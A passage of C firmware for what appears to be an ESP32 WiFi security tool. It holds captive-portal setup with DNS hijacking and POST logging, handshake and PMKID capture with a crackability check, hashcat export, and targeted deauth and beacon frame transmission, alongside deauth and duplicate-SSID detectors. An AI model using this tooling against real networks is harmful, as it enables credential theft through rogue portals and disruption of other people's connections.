    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }   /* joins the httpd task -> no more handlers */

    s_dns_run = false;                                      /* the DNS task exits within its rx timeout */
    for (int i = 0; i < 20 && s_dns_task != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (s_dns_sock >= 0) { close(s_dns_sock); s_dns_sock = -1; }

    if (s_portal_page) { free(s_portal_page); s_portal_page = NULL; s_portal_page_len = 0; }
    if (s_portal_sd_ok) { nocsif_usb_gadget_release_sd(); s_portal_sd_ok = false; }
    ESP_LOGI(TAG, "captive portal OFF (%u hits)", (unsigned)s_portal_hits);
}

static void do_portal_on(void)
{
    if (s_portal_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_ap_active) {
        do_ap_on();                                     /* the portal rides on the open AP */
    }
    if (!s_ap_active) {
        ESP_LOGW(TAG, "portal: AP did not start");
        return;
    }
    portal_sel_ensure_loaded();

    s_portal_hits = 0;                                  /* fresh session */
    s_portal_page = NULL;
    s_portal_page_len = 0;
    s_portal_page_tried = false;
    s_portal_logpath[0] = '\0';
    portENTER_CRITICAL(&s_portal_mux);
    s_portal_log_head = s_portal_log_cnt = 0;
    portEXIT_CRITICAL(&s_portal_mux);
    s_portal_gen++;

    s_portal_sd_ok = (nocsif_usb_gadget_claim_sd(1500) == ESP_OK);   /* page + log (best-effort) */

    s_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s_dns_sock >= 0) {
        struct sockaddr_in sa = { 0 };
        sa.sin_family = AF_INET;
        sa.sin_port = htons(53);
        sa.sin_addr.s_addr = htonl(INADDR_ANY);
        if (bind(s_dns_sock, (struct sockaddr *)&sa, sizeof sa) != 0) {
            close(s_dns_sock); s_dns_sock = -1;
        }
    }
    if (s_dns_sock >= 0) {
        s_dns_run = true;
        if (xTaskCreateWithCaps(portal_dns_task, "wifidns", 4096, NULL, 4, &s_dns_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            s_dns_run = false; close(s_dns_sock); s_dns_sock = -1; s_dns_task = NULL;
            ESP_LOGW(TAG, "portal: DNS task create failed");
        }
    }

    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.server_port      = 80;
    hc.stack_size       = 8192;                          /* FATFS page/log I/O runs on this task */
    hc.max_uri_handlers = 4;
    hc.lru_purge_enable = true;
    hc.uri_match_fn     = httpd_uri_match_wildcard;
    if (httpd_start(&s_httpd, &hc) == ESP_OK) {
        httpd_uri_t g = { .uri = "/*", .method = HTTP_GET,  .handler = portal_http_req };
        httpd_uri_t p = { .uri = "/*", .method = HTTP_POST, .handler = portal_http_req };
        httpd_register_uri_handler(s_httpd, &g);
        httpd_register_uri_handler(s_httpd, &p);
    } else {
        s_httpd = NULL;
        ESP_LOGE(TAG, "portal: httpd_start failed");
    }

    if (s_httpd == NULL) {                               /* HTTP is mandatory; roll the session back */
        portal_stop();
        publish_status("err");
        publish_detail("Portal failed to start.");
        return;
    }

    s_portal_active = true;
    ESP_LOGW(TAG, "captive portal ON (dns=%s http=80 sd=%s); int-dma free=%u",
             s_dns_task ? "up" : "off", s_portal_sd_ok ? "yes" : "no",
             (unsigned)nocsif_int_dma_free());
    refresh_strings();
}

static void do_portal_off(void)
{
    portal_stop();
    refresh_strings();
}

/* Re-serve a newly-selected landing page on a running portal: a clean stop→start on the worker (the AP
 * stays up). A no-op if the portal is not active — the new selection just applies at the next Start. */
static void do_portal_reload(void)
{
    if (!s_portal_active) {
        return;
    }
    portal_stop();
    do_portal_on();
}

/* ---- monitor published getters (RAM/volatile; LVGL-task-safe) ---------------------- */
bool     nocsif_wifi_monitor_active(void)    { return s_mon_active; }
bool     nocsif_wifi_monitor_hopping(void)   { return s_mon_hop; }
int      nocsif_wifi_monitor_channel(void)   { return s_mon_chan; }
uint32_t nocsif_wifi_monitor_total(void)     { return s_mon_total; }
uint32_t nocsif_wifi_monitor_rate(void)      { return s_mon_rate; }
int8_t   nocsif_wifi_monitor_rssi_last(void) { return s_mon_rssi_last; }
int8_t   nocsif_wifi_monitor_rssi_peak(void) { return s_mon_rssi_peak; }

uint32_t nocsif_wifi_monitor_count(nocsif_wifi_pkt_kind_t kind)
{
    if ((int)kind < 0 || kind >= NOCSIF_WIFI_PKT_KINDS) {
        return 0;
    }
    return s_mon_by_type[kind];
}

uint32_t nocsif_wifi_monitor_ch_count(int ch)
{
    if (ch < 1 || ch > 13) {
        return 0;
    }
    return s_mon_ch[ch];
}

const char *nocsif_wifi_monitor_tag_str(void)
{
    static char buf[16];
    if (!s_mon_active && !s_pending_monitor) {
        return "off";
    }
    if (s_mon_hop) {
        snprintf(buf, sizeof buf, "ch %d", s_mon_chan);
    } else {
        snprintf(buf, sizeof buf, "lock %d", s_mon_chan);
    }
    return buf;
}

/* ---- passive parser getters (M5-P3; snapshot copies, LVGL-task-safe) --------------- */
bool     nocsif_wifi_parse_active(void)  { return s_parse_active; }
int      nocsif_wifi_mon_ap_count(void)  { return s_mon_ap_cnt; }
uint32_t nocsif_wifi_mon_ap_gen(void)    { return s_mon_ap_gen; }

bool nocsif_wifi_mon_ap_get(int idx, nocsif_wifi_mon_ap_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_ap_t tmp;
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_ap_cnt && s_mon_ap[idx].used);
    if (ok) {
        tmp = s_mon_ap[idx];                          /* whole-struct copy under the lock */
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, tmp.ssid, sizeof out->ssid);
    out->channel  = tmp.channel;
    out->rssi     = tmp.rssi;
    out->security = tmp.sec;
    out->frames   = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_sec_str(uint8_t sec)
{
    switch (sec) {
        case NOCSIF_WIFI_SEC_OPEN:  return "open";
        case NOCSIF_WIFI_SEC_WEP:   return "WEP";
        case NOCSIF_WIFI_SEC_WPA:   return "WPA";
        case NOCSIF_WIFI_SEC_WPA2:  return "WPA2";
        case NOCSIF_WIFI_SEC_WPA3:  return "WPA3";
        case NOCSIF_WIFI_SEC_WPA2E: return "WPA2-E";
        default:                    return "?";
    }
}

const char *nocsif_wifi_mon_ap_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_ap_cnt);
    return buf;
}

/* ---- station list getters (M5-P3·2; snapshot copies, LVGL-task-safe) ---------------- */
int      nocsif_wifi_mon_sta_count(void) { return s_mon_sta_cnt; }
uint32_t nocsif_wifi_mon_sta_gen(void)   { return s_mon_sta_gen; }

bool nocsif_wifi_mon_sta_get(int idx, nocsif_wifi_mon_sta_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_sta_t tmp;
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_sta_cnt && s_mon_sta[idx].used);
    if (ok) {
        tmp = s_mon_sta[idx];                         /* whole-struct copy under the lock */
        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolve the AP's SSID by BSSID */
            if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                break;
            }
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->mac, tmp.mac, 6);
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, ssid, sizeof out->ssid);
    out->channel = tmp.channel;
    out->rssi    = tmp.rssi;
    out->frames  = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_sta_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_sta_cnt);
    return buf;
}

/* ---- probe-request getters (M5-P3·2; snapshot copies, LVGL-task-safe) --------------- */
int      nocsif_wifi_mon_probe_count(void) { return s_mon_probe_cnt; }
uint32_t nocsif_wifi_mon_probe_gen(void)   { return s_mon_probe_gen; }

bool nocsif_wifi_mon_probe_get(int idx, nocsif_wifi_mon_probe_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_probe_t tmp;
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_probe_cnt && s_mon_probe[idx].used);
    if (ok) {
        tmp = s_mon_probe[idx];
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->mac, tmp.mac, 6);
    memcpy(out->ssid, tmp.ssid, sizeof out->ssid);
    out->rssi  = tmp.rssi;
    out->count = tmp.count;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_probe_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_probe_cnt);
    return buf;
}

/* ---- key-exchange getters (M5-P4·1; snapshot copies, LVGL-task-safe) ---------------- */
int      nocsif_wifi_mon_hs_count(void) { return s_mon_hs_cnt; }
uint32_t nocsif_wifi_mon_hs_gen(void)   { return s_mon_hs_gen; }

bool nocsif_wifi_mon_hs_get(int idx, nocsif_wifi_mon_hs_t *out)
{
    if (out == NULL) {
        return false;
    }
    mon_hs_t tmp;
    char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool ok;
    portENTER_CRITICAL(&s_ap_mux);
    ok = (idx >= 0 && idx < s_mon_hs_cnt && s_mon_hs[idx].used);
    if (ok) {
        tmp = s_mon_hs[idx];                          /* whole-struct copy under the lock */
        for (int i = 0; i < s_mon_ap_cnt; i++) {      /* resolve the AP's SSID by BSSID */
            if (s_mon_ap[i].used && memcmp(s_mon_ap[i].bssid, tmp.bssid, 6) == 0) {
                memcpy(ssid, s_mon_ap[i].ssid, sizeof ssid);
                break;
            }
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);
    if (!ok) {
        return false;
    }
    memcpy(out->bssid, tmp.bssid, 6);
    memcpy(out->ssid, ssid, sizeof out->ssid);
    out->msg_mask  = tmp.msg_mask;
    out->has_pmkid = tmp.has_pmkid;
    memcpy(out->pmkid, tmp.pmkid, sizeof out->pmkid);
    out->rssi   = tmp.rssi;
    out->frames = tmp.frames;
    memcpy(out->vendor, tmp.vendor, sizeof out->vendor);
    int64_t age = esp_timer_get_time() - tmp.last_us;
    out->age_ms = age > 0 ? (uint32_t)(age / 1000) : 0;
    return true;
}

const char *nocsif_wifi_mon_hs_tag_str(void)
{
    static char buf[16];
    if (!s_parse_active) {
        return "off";
    }
    snprintf(buf, sizeof buf, "%d seen", s_mon_hs_cnt);
    return buf;
}

bool nocsif_wifi_hs_crackable(const nocsif_wifi_mon_hs_t *hs)
{
    if (hs == NULL) {
        return false;
    }
    if (hs->has_pmkid) {
        return true;                                  /* PMKID alone is enough */
    }
    return (hs->msg_mask & 0x03) == 0x03;             /* msg1 + msg2: the pair the offline check needs */
}

/* ---- anomaly detectors (M5-P4·2; RAM/volatile + AP-table snapshot, LVGL-task-safe) --- */
uint32_t nocsif_wifi_deauth_count(void)     { return s_mon_deauth; }
uint32_t nocsif_wifi_disassoc_count(void)   { return s_mon_disassoc; }
uint32_t nocsif_wifi_deauth_rate(void)      { return s_mon_dd_rate; }
uint32_t nocsif_wifi_deauth_peak_rate(void) { return s_mon_dd_peak; }

const char *nocsif_wifi_anomaly_tag_str(void)
{
    static char buf[16];
    if (!s_mon_active) {
        return "off";
    }
    if (s_mon_dd_rate > 0) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_mon_dd_rate);   /* live deauth/disassoc rate */
        return buf;
    }
    return "ok";
}

int nocsif_wifi_mon_dup_snapshot(nocsif_wifi_mon_dup_t *arr, int max)
{
    if (arr == NULL || max < 0) {
        return 0;
    }
    /* Copy (SSID, security) out of the AP table under the lock, then group off-lock so the short
     * spinlock never spans the O(n^2) compare. Each AP entry is a DISTINCT BSSID (the table is
     * BSSID-keyed), so counting same-SSID entries counts the distinct BSSIDs advertising it. */
    struct { char ssid[WIFI_SSID_MAX]; uint8_t sec; } snap[MON_AP_MAX];
    int cnt = 0;
    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < s_mon_ap_cnt && cnt < MON_AP_MAX; i++) {
        if (s_mon_ap[i].used && s_mon_ap[i].ssid[0]) {
            memcpy(snap[cnt].ssid, s_mon_ap[i].ssid, WIFI_SSID_MAX);
            snap[cnt].sec = s_mon_ap[i].sec;
            cnt++;
        }
    }
    portEXIT_CRITICAL(&s_ap_mux);

    bool done[MON_AP_MAX] = { false };
    int groups = 0;
    for (int i = 0; i < cnt; i++) {
        if (done[i]) continue;
        int     n   = 1;
        uint8_t lo  = snap[i].sec, hi = snap[i].sec;
        bool    open = (snap[i].sec == NOCSIF_WIFI_SEC_OPEN);
        done[i] = true;
        for (int j = i + 1; j < cnt; j++) {
            if (done[j]) continue;
            if (strcmp(snap[j].ssid, snap[i].ssid) == 0) {
                done[j] = true;
                n++;
                if (snap[j].sec < lo) lo = snap[j].sec;
                if (snap[j].sec > hi) hi = snap[j].sec;
                if (snap[j].sec == NOCSIF_WIFI_SEC_OPEN) open = true;
            }
        }
        if (n >= 2) {                                  /* an SSID on 2+ BSSIDs — report the group */
            if (groups < max) {
                nocsif_wifi_mon_dup_t *d = &arr[groups];
                snprintf(d->ssid, sizeof d->ssid, "%s", snap[i].ssid);
                d->bssids       = (uint8_t)(n > 255 ? 255 : n);
                d->sec_mismatch = (lo != hi);
                d->has_open     = open;
                d->sec_lo       = lo;
                d->sec_hi       = hi;
            }
            groups++;
        }
    }
    return groups;
}

/* ---- PCAP getters (M5-P3·3; RAM/volatile, LVGL-task-safe) --------------------------- */
bool     nocsif_wifi_pcap_active(void)  { return s_pcap_active; }
uint32_t nocsif_wifi_pcap_frames(void)  { return s_pcap_frames; }
uint32_t nocsif_wifi_pcap_bytes(void)   { return s_pcap_bytes; }
uint32_t nocsif_wifi_pcap_dropped(void) { return s_pcap_drop; }
const char *nocsif_wifi_pcap_path(void) { return s_pcap_path; }

bool nocsif_wifi_pcap_stream_active(void) { return s_pcap_want && s_pcap_sink == PCAP_SINK_CDC; }

const char *nocsif_wifi_pcap_status_str(void)
{
    switch (s_pcap_state) {
        case PCAP_REC:       return "rec";
        case PCAP_NOSD:      return "no card";
        case PCAP_FILESHARE: return "file share";
        case PCAP_ERR:       return "err";
        case PCAP_STREAM:    return "stream";
        case PCAP_NOHOST:    return "no host";
        default:             return "off";
    }
}

const char *nocsif_wifi_pcap_tag_str(void)
{
    return nocsif_wifi_pcap_status_str();
}

static void wifi_task(void *arg)
{
    (void)arg;
    wifi_cmd_t c;
    for (;;) {
        if (xQueueReceive(s_q, &c, portMAX_DELAY) != pdTRUE) {
            continue;
        }
        switch (c.type) {
        case CMD_ENABLE:     do_enable();  break;
        case CMD_DISABLE:    do_disable(); break;
        case CMD_SCAN:       do_scan();    break;
        case CMD_SCAN_DONE:  do_scan_done(); break;
        case CMD_CONNECT:    do_connect(c.ssid, c.pass); break;
        case CMD_DISCONNECT: do_disconnect(); break;
        case CMD_FORGET:     do_forget(); break;
        case CMD_RECONNECT:  do_reconnect(); break;
        case CMD_RANDMAC:    do_randmac(); break;
        case CMD_RESTMAC:    do_restmac(); break;
        case CMD_APPLY_HOST: do_apply_host(); break;
        case CMD_CONNECT_SAVED: do_connect_saved(c.ssid); break;
        case CMD_FORGET_SSID:   do_forget_ssid(c.ssid); break;
        case CMD_SETMAC:        apply_mac(c.mac); break;
        case CMD_MONITOR_ON:    do_monitor_on(); break;
        case CMD_MONITOR_OFF:   do_monitor_off(); break;
        case CMD_MON_HOP:       do_mon_hop(c.arg != 0); break;
        case CMD_MON_CHAN:      do_mon_chan((int)c.arg); break;
        case CMD_PARSE_ON:      do_parse_on(); break;
        case CMD_PARSE_OFF:     do_parse_off(); break;
        case CMD_PCAP_ON:       if (!s_pcap_want) { s_pcap_filter = PCAP_FILTER_FULL; do_pcap_on(); } break;
        case CMD_PCAP_OFF:      do_pcap_off(); break;
        case CMD_PCAP_STREAM_ON:  do_pcap_stream_on();  break;
        case CMD_PCAP_STREAM_OFF: do_pcap_stream_off(); break;
        case CMD_HS_ON:         do_hs_capture_on(); break;
        case CMD_HS_OFF:        do_pcap_off(); break;   /* shared writer stop */
        case CMD_MGMTTX_ON:     do_mgmt_tx_on(); break;
        case CMD_MGMTTX_OFF:    do_mgmt_tx_off(); break;
        case CMD_MGMTTX_TARGET: do_mgmt_tx_target(c.mac, (int)c.arg, c.ssid); break;
        case CMD_BEACON_ON:     do_beacon_on(); break;
        case CMD_BEACON_OFF:    do_beacon_off(); break;
        case CMD_EXPORT_HC:     do_export_hc(); break;
        /* §4.8a: the software AP + portal are mutually exclusive with the companion surface (which owns
         * port 80) — fully cycle companion off first, then clear its SSID override. */
        case CMD_AP_ON:         if (s_comp_active) do_companion_off(); s_ap_ssid_ov[0] = '\0'; do_ap_on(); break;
        case CMD_AP_OFF:        do_ap_off(); break;
        case CMD_PORTAL_ON:     if (s_comp_active) do_companion_off(); s_ap_ssid_ov[0] = '\0'; do_portal_on(); break;
        case CMD_PORTAL_OFF:    do_portal_off(); break;
        case CMD_PORTAL_RELOAD: do_portal_reload(); break;
        case CMD_COMPANION_ON:  do_companion_on(); break;
        case CMD_COMPANION_OFF: do_companion_off(); break;
        case CMD_LEAN_ON:       do_lean_set(true);  break;
        case CMD_LEAN_OFF:      do_lean_set(false); break;
        case CMD_GEO_STAMP:     do_geo_stamp(c.arg, c.arg2); break;   /* §4.6 P3 */
        }
    }
}

/* ---- public API ------------------------------------------------------------------- */
static void post(wifi_cmd_type_t type, const char *ssid, const char *pass)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = type };
    if (ssid) { snprintf(c.ssid, sizeof c.ssid, "%s", ssid); }
    if (pass) { snprintf(c.pass, sizeof c.pass, "%s", pass); }
    xQueueSend(s_q, &c, 0);     /* non-blocking; a full queue drops the request (UI retries) */
}

void nocsif_wifi_request_geo_stamp(int32_t lat_ud, int32_t lon_ud)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_GEO_STAMP, .arg = lat_ud, .arg2 = lon_ud };
    xQueueSend(s_q, &c, 0);     /* non-blocking; a dropped stamp is re-offered on the next fresh fix */
}

static void post_mac(const uint8_t mac[6])
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_SETMAC };
    memcpy(c.mac, mac, 6);
    xQueueSend(s_q, &c, 0);
}

/* Post the management-frame TX target (BSSID in mac, channel in arg, SSID in ssid). */
static void post_target(const uint8_t bssid[6], int channel, const char *ssid)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = CMD_MGMTTX_TARGET, .arg = channel };
    memcpy(c.mac, bssid, 6);
    if (ssid) { snprintf(c.ssid, sizeof c.ssid, "%s", ssid); }
    xQueueSend(s_q, &c, 0);
}

static void post_i(wifi_cmd_type_t type, int32_t arg)
{
    if (s_q == NULL) {
        return;
    }
    wifi_cmd_t c = { .type = type, .arg = arg };
    xQueueSend(s_q, &c, 0);
}

esp_err_t nocsif_wifi_init(void)
{
    if (s_task != NULL) {
        return ESP_OK;          /* idempotent */
    }
    if (nocsif_reliability_safe_mode()) {
        publish_status("off");
        publish_detail("WiFi disabled (safe mode).");
        ESP_LOGW(TAG, "safe mode — WiFi bring-up skipped");
        return ESP_OK;          /* no task; nocsif_wifi_available() stays false */
    }

    load_creds();               /* prime the RAM cache before any getter runs */
    load_saved();               /* prime the saved-profile list (migrates the legacy slot) */
    ap_cfg_ensure_loaded();     /* prime the software-AP config (SSID/channel/hidden) */
    s_autojoin = nocsif_settings_get_i32(K_AUTOJOIN, 1) != 0;   /* default: auto-join on */
    if (esp_read_mac(s_mac_factory, ESP_MAC_WIFI_STA) == ESP_OK) {
        s_mac_factory_ok = true;
        char s[18];             /* show the factory MAC before the radio is even brought up */
        format_mac(s, sizeof s, s_mac_factory);
        publish_mac_str(s);
    }
    publish_status("off");
    publish_detail("WiFi off");
    clear_netinfo();

    s_q = xQueueCreate(WIFI_CMD_QLEN, sizeof(wifi_cmd_t));
    if (s_q == NULL) {
        ESP_LOGE(TAG, "failed to create command queue");
        return ESP_ERR_NO_MEM;
    }
    /* Priority below the UI/system tasks; the event handlers do the reactive work, so the
     * worker mostly blocks on the queue. Not Task-WDT-subscribed (no unbounded spin). */
    if (xTaskCreate(wifi_task, "wifi", 4096, NULL, 4, &s_task) != pdPASS) {
        ESP_LOGE(TAG, "failed to create wifi worker task");
        vQueueDelete(s_q);
        s_q = NULL;
        s_task = NULL;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "wifi worker ready (lazy bring-up on first enable/scan)");
    return ESP_OK;
}

void nocsif_wifi_request_enable(bool on)      { post(on ? CMD_ENABLE : CMD_DISABLE, NULL, NULL); }
void nocsif_wifi_set_lean(bool lean)
{
    /* Before the worker exists (main.c arms this at boot, ahead of nocsif_wifi_init, so WiFi comes up
     * lean from the very first init) set the flag directly — post() would drop it on the NULL queue. */
    if (s_q == NULL) {
        s_lean = lean;
        return;
    }
    post(lean ? CMD_LEAN_ON : CMD_LEAN_OFF, NULL, NULL);
}
bool nocsif_wifi_is_lean(void)                { return s_lean; }
void nocsif_wifi_request_scan(void)           { post(CMD_SCAN, NULL, NULL); }
void nocsif_wifi_request_connect(const char *ssid, const char *pass)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
    post(CMD_CONNECT, ssid, pass);
}
void nocsif_wifi_request_disconnect(void)     { post(CMD_DISCONNECT, NULL, NULL); }
void nocsif_wifi_request_forget(void)         { post(CMD_FORGET, NULL, NULL); }

void nocsif_wifi_request_reconnect(void)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
    post(CMD_RECONNECT, NULL, NULL);
}
void nocsif_wifi_request_randomize_mac(void)  { post(CMD_RANDMAC, NULL, NULL); }
void nocsif_wifi_request_restore_mac(void)    { post(CMD_RESTMAC, NULL, NULL); }
void nocsif_wifi_apply_hostname(void)         { post(CMD_APPLY_HOST, NULL, NULL); }
void nocsif_wifi_request_set_mac(const uint8_t mac[6]) { if (mac) post_mac(mac); }
void nocsif_wifi_forget_ssid(const char *ssid)         { post(CMD_FORGET_SSID, ssid, NULL); }
void nocsif_wifi_connect_saved(const char *ssid)
{
    s_join_state = NOCSIF_WIFI_JOIN_JOINING;   /* reflect "joining" the instant the UI asks */
    post(CMD_CONNECT_SAVED, ssid, NULL);
}

void nocsif_wifi_set_autojoin(bool on)
{
    s_autojoin = on;
    nocsif_settings_set_i32(K_AUTOJOIN, on ? 1 : 0);
    ESP_LOGI(TAG, "auto-join %s", on ? "on" : "off");
}

/* ---- monitor mode requests (M5-P2) ------------------------------------------------- */
void nocsif_wifi_request_monitor(bool on)          { post(on ? CMD_MONITOR_ON : CMD_MONITOR_OFF, NULL, NULL); }
void nocsif_wifi_request_monitor_hop(bool hop)     { post_i(CMD_MON_HOP, hop ? 1 : 0); }
void nocsif_wifi_request_monitor_channel(int ch)   { post_i(CMD_MON_CHAN, ch); }

/* ---- passive parser request (M5-P3) ------------------------------------------------ */
void nocsif_wifi_request_parse(bool on)            { post(on ? CMD_PARSE_ON : CMD_PARSE_OFF, NULL, NULL); }

/* ---- PCAP capture request (M5-P3·3) ------------------------------------------------- */
void nocsif_wifi_request_pcap(bool on)             { post(on ? CMD_PCAP_ON : CMD_PCAP_OFF, NULL, NULL); }
void nocsif_wifi_request_pcap_stream(bool on)      { post(on ? CMD_PCAP_STREAM_ON : CMD_PCAP_STREAM_OFF, NULL, NULL); }
void nocsif_wifi_request_hs_capture(bool on)       { post(on ? CMD_HS_ON : CMD_HS_OFF, NULL, NULL); }

/* ---- management-frame TX requests + state (M5-P5·1, active) ------------------------- */
void nocsif_wifi_request_mgmt_tx(bool on)          { post(on ? CMD_MGMTTX_ON : CMD_MGMTTX_OFF, NULL, NULL); }
void nocsif_wifi_set_mgmt_target(const uint8_t bssid[6], int channel, const char *ssid) { post_target(bssid, channel, ssid); }
void nocsif_wifi_set_mgmt_disassoc(bool disassoc)  { s_tx_disassoc = disassoc; }
bool nocsif_wifi_mgmt_disassoc(void)               { return s_tx_disassoc; }
bool nocsif_wifi_mgmt_tx_active(void)              { return s_tx_active; }
bool nocsif_wifi_mgmt_has_target(void)             { return s_tx_have_target; }
uint32_t nocsif_wifi_mgmt_tx_count(void)           { return s_tx_count; }
uint32_t nocsif_wifi_mgmt_tx_rate(void)            { return s_tx_rate; }

const char *nocsif_wifi_mgmt_target_str(void)
{
    static char buf[64];
    if (!s_tx_have_target) {
        return "none";
    }
    snprintf(buf, sizeof buf, "%s \xC2\xB7 %02x:%02x:%02x:%02x:%02x:%02x \xC2\xB7 ch %d",
             s_tx_ssid[0] ? s_tx_ssid : "(hidden)",
             s_tx_bssid[0], s_tx_bssid[1], s_tx_bssid[2],
             s_tx_bssid[3], s_tx_bssid[4], s_tx_bssid[5], s_tx_channel);
    return buf;
}

const char *nocsif_wifi_mgmt_tx_tag_str(void)
{
    static char buf[16];
    if (s_tx_active) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_tx_rate);
        return buf;
    }
    return s_tx_have_target ? "armed" : "off";
}

/* ---- beacon TX requests + state (M5-P5·2, active; list API is defined with the beacon TX code) -- */
void nocsif_wifi_request_beacon(bool on)           { post(on ? CMD_BEACON_ON : CMD_BEACON_OFF, NULL, NULL); }
bool nocsif_wifi_beacon_active(void)               { return s_bcn_active; }
uint32_t nocsif_wifi_beacon_frames(void)           { return s_bcn_frames; }
uint32_t nocsif_wifi_beacon_rate(void)             { return s_bcn_rate; }

const char *nocsif_wifi_beacon_tag_str(void)
{
    static char buf[16];
    if (s_bcn_active) {
        snprintf(buf, sizeof buf, "%u/s", (unsigned)s_bcn_rate);
        return buf;
    }
    return s_bcn_cnt > 0 ? "ready" : "off";
}

/* ---- software AP requests + config + state (M5-P5·3, active) ------------------------ */
void nocsif_wifi_request_ap(bool on) { post(on ? CMD_AP_ON : CMD_AP_OFF, NULL, NULL); }

void nocsif_wifi_ap_set_ssid(const char *ssid)
{
    ap_cfg_ensure_loaded();
    if (!ssid || !ssid[0]) {
        return;
    }
    char clean[WIFI_SSID_MAX];
    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 chars */
    portENTER_CRITICAL(&s_sap_mux);
    memcpy(s_ap_ssid, clean, sizeof clean);
    portEXIT_CRITICAL(&s_sap_mux);
    nocsif_settings_set_str(K_AP_SSID, clean);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); } /* re-apply live */
}

void nocsif_wifi_ap_set_channel(int channel)
{
    ap_cfg_ensure_loaded();
    if (channel < 1)  channel = 1;
    if (channel > 13) channel = 13;
    s_ap_channel = channel;
    nocsif_settings_set_i32(K_AP_CHAN, channel);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); }
}

void nocsif_wifi_ap_set_hidden(bool hidden)
{
    ap_cfg_ensure_loaded();
    s_ap_hidden = hidden;
    nocsif_settings_set_i32(K_AP_HIDDEN, hidden ? 1 : 0);
    if (s_ap_active) { post(CMD_AP_ON, NULL, NULL); }
}

bool        nocsif_wifi_ap_active(void)  { return s_ap_active; }
int         nocsif_wifi_ap_channel(void) { ap_cfg_ensure_loaded(); return s_ap_channel; }
bool        nocsif_wifi_ap_hidden(void)  { ap_cfg_ensure_loaded(); return s_ap_hidden; }
const char *nocsif_wifi_ap_ip_str(void)  { return s_ap_ip; }
uint32_t    nocsif_wifi_ap_gen(void)     { return s_ap_cli_gen; }

const char *nocsif_wifi_ap_ssid(void)
{
    ap_cfg_ensure_loaded();
    return s_ap_ssid;   /* module-owned; setter writes are ≤33 bytes (display-only read) */
}

int nocsif_wifi_ap_client_count(void)
{
    int i = s_ap_cli_i;
    return s_ap_cli_cnt[i];
}

bool nocsif_wifi_ap_client_get(int idx, uint8_t mac[6], char *ip, size_t iplen, int8_t *rssi)
{
    int i = s_ap_cli_i;                 /* read the published buffer lock-free */
    if (idx < 0 || idx >= s_ap_cli_cnt[i]) {
        return false;
    }
    if (mac) { memcpy(mac, s_ap_cli[i][idx].mac, 6); }
    if (ip && iplen) { snprintf(ip, iplen, "%s", s_ap_cli[i][idx].ip); }
    if (rssi) { *rssi = s_ap_cli[i][idx].rssi; }
    return true;
}

const char *nocsif_wifi_ap_tag_str(void)
{
    static char buf[16];
    if (s_ap_active) {
        int n = s_ap_cli_cnt[s_ap_cli_i];
        if (n <= 0) {
            return "on";
        }
        snprintf(buf, sizeof buf, "%d joined", n);
        return buf;
    }
    return "off";
}

/* ---- captive portal requests + state (M5-P5·4, active) ----------------------------- */
void     nocsif_wifi_request_portal(bool on) { post(on ? CMD_PORTAL_ON : CMD_PORTAL_OFF, NULL, NULL); }
